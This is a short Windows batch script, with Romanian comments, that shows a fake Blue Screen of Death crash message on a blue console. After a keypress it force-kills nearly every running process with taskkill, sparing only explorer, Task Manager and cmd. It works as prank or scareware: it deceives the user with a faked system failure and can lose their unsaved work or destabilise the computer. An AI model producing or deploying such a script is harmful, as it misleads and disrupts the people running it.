@echo off
color 1f
cls
echo A problem has been detected and Windows has been shut down to prevent damage to your computer.
echo.
echo Technical information:
echo *** STOP: 0x0000007B (0xFFFFFA8004AC56E0, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)
echo.
echo If this is the first time you've seen this stop error screen, restart your computer. If this screen appears again, follow these steps:
echo Check for viruses on your computer. Remove any newly installed hard drives or hard drive controllers. Check your hard drive to make sure it is properly configured and terminated.
echo Run CHKDSK /F to check for hard drive corruption, and then restart your computer.
echo.
echo Press any key to continue...
pause >nul

:: Închide aplicațiile care nu sunt esențiale pentru Windows
echo Closing non-essential applications...
tasklist /FI "STATUS eq running" > tasklist.txt
for /F "tokens=1,2" %%A in (tasklist.txt) do (
    set proc_name=%%A
    set proc_pid=%%B
    call :close_proc
)

:: Afișează o fereastră cu BSOD simulată
exit

:close_proc
rem Excludem procesele Windows esențiale
if /I "%proc_name%" NEQ "explorer.exe" (
    if /I "%proc_name%" NEQ "taskmgr.exe" (
        if /I "%proc_name%" NEQ "cmd.exe" (
            taskkill /F /PID %proc_pid%
            echo Terminated process: %proc_name%
        )
    )
)
goto :eof
